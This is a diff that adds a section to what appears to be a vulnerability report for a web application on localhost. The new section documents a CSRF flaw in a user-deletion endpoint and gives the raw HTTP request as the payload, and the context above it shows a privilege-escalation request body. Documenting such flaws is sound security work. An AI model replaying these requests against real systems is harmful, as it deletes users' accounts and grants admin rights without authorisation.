@@ -128,3 +128,24 @@ Upgrade-Insecure-Requests: 1
 
 name=Admin+Phi&username=phi_admin&password=phi_admin&role=Privilege_Escalation_To_Admin
 ```
+
+
+### 5. POST "/delete/user/{id}"
+- Bug: CSRF
+- Param: 
+- Payload:
+```
+POST /dashboard/delete/user/17 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/dashboard/user-list
+Cookie: JSESSIONID=5E15B253BE02480408D388A84045995A
+Upgrade-Insecure-Requests: 1
+```
